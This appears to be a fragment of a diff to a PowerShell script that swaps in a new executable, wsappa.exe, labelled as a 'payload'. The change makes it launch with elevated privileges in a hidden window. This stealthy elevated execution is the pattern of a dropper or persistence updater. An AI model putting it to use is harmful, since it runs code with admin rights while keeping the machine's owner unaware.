@@ -10,5 +10,7 @@ remove-item wsappa.exe
 #change name
 rename-item new_wsappa.exe wsappa.exe
 
+
+
 #start new payload
-Start-Process -FilePath "wsappa.exe"
+Start-Process -FilePath "wsappa.exe" -Verb RunAs -WindowStyle Hidden
